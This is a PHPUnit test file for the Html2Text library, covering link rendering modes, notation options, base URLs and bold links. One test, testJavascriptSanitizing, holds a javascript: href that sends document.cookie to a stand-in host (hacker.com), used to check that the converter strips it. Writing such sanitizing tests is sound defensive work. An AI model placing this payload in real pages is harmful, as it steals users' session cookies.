<?php

namespace Html2Text;

class LinkTest extends \PHPUnit_Framework_TestCase
{
    const TEST_HTML = '<a href="http://example.com">Link text</a>';

    public function testDoLinksAfter()
    {
        $expected =<<<EOT
Link text [1]

Links:
------
[1] http://example.com

EOT;

        $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'table'));
        $output = $html2text->getText();

        $this->assertEquals($expected, $output);
    }

    /**
     * @dataProvider doLinksInlineProvider
     */
    public function testDoLinksInline(array $options, $expected)
    {
        $options = array_merge(array('do_links' => 'inline'), $options);
        $html2text = new Html2Text(self::TEST_HTML, $options);
        $output = $html2text->getText();

        $this->assertEquals($expected, $output);
    }

    public function doLinksInlineProvider()
    {
        $expected_square = <<<EOT
Link text [http://example.com]
EOT;
        $expected_round = <<<EOT
Link text (http://example.com)
EOT;

        return array(
            // Not passing the option should default to square
            array(array(), $expected_square),
            // Passing junk should default to square
            array(array('link_notation' => 'junk'), $expected_square),
            // Passing as square should be... square
            array(array('link_notation' => 'square'), $expected_square),
            // Passing as round should be round
            array(array('link_notation' => 'round'), $expected_round),
        );
    }

    public function testDoLinksNone()
    {
        $expected =<<<EOT
Link text
EOT;

        $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'none'));
        $output = $html2text->getText();

        $this->assertEquals($output, $expected);
    }

    /**
     * @dataProvider doLinksNextlineProvider
     */
    public function testDoLinksNextline(array $options, $expected)
    {
        $options = array_merge(array('do_links' => 'nextline'), $options);

        $html2text = new Html2Text(self::TEST_HTML, $options);
        $output = $html2text->getText();

        $this->assertEquals($expected, $output);
    }

    public function doLinksNextlineProvider()
    {
        $expected_square = <<<EOT
Link text
[http://example.com]
EOT;
        $expected_round = <<<EOT
Link text
(http://example.com)
EOT;

        return array(
            // Not passing the option should default to square
            array(array(), $expected_square),
            // Passing junk should default to square
            array(array('link_notation' => 'junk'), $expected_square),
            // Passing as square should be... square
            array(array('link_notation' => 'square'), $expected_square),
            // Passing as round should be round
            array(array('link_notation' => 'round'), $expected_round),
        );
    }

    public function testDoLinksInHtml()
    {
        $html =<<<EOT
<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
EOT;

        $expected =<<<EOT
Link text

Link text [http://example.com]

Link text
[http://example.com]

EOT;

        $html2text = new Html2Text($html);
        $output = $html2text->getText();

        $this->assertEquals($expected, $output);
    }

    public function testBaseUrl()
    {
        $html = '<a href="/relative">Link text</a>';
        $expected = 'Link text [http://example.com/relative]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));
        $html2text->setBaseUrl('http://example.com');

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testBaseUrlWithPlaceholder()
    {
        $html = '<a href="/relative">Link text</a>';
        $expected = 'Link text [%baseurl%/relative]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));
        $html2text->setBaseUrl('%baseurl%');

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testBoldLinks()
    {
        $html = '<b><a href="http://example.com">Link text</a></b>';
        $expected = 'LINK TEXT [http://example.com]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testInvertedBoldLinks()
    {
        $html = '<a href="http://example.com"><b>Link text</b></a>';
        $expected = 'LINK TEXT [http://example.com]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testJavascriptSanitizing()
    {
        $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
        $expected = 'Link text';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testDoLinksBBCode()
    {
        $html = '<a href="http://example.com"><b>Link text</b></a>';
        $expected = '[url=http://example.com]LINK TEXT[/url]';

        $html2text = new Html2Text($html, array('do_links' => 'bbcode'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testDoLinksWhenTargetInText()
    {
        $html = '<a href="http://example.com">http://example.com</a>';
        $expected = 'http://example.com';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());

        $html2text = new Html2Text($html, array('do_links' => 'nextline'));

        $this->assertEquals($expected, $html2text->getText());
    }
}
